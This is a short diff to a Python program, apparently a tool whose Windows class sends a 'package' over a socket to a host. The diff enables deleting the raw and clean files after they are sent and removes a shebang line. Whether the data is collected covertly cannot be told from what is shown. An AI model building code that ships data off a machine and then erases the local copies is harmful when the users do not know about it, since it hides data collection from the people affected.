@@ -21,8 +21,6 @@ TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 """
 
-#!/usr/bin/env python
-
 import os
 import socket
 import sys
@@ -173,8 +171,8 @@ class Windows:
                 sock.connect((host, PORT))
                 sock.send(package)
                 sock.close()
-        #os.remove(raw_filename)
-        #os.remove(clean_filename)
+        os.remove(raw_filename)
+        os.remove(clean_filename)
 
 
 class Main:
@@ -190,4 +188,3 @@ class Main:
 
 if __name__ == '__main__':
     Main()
-
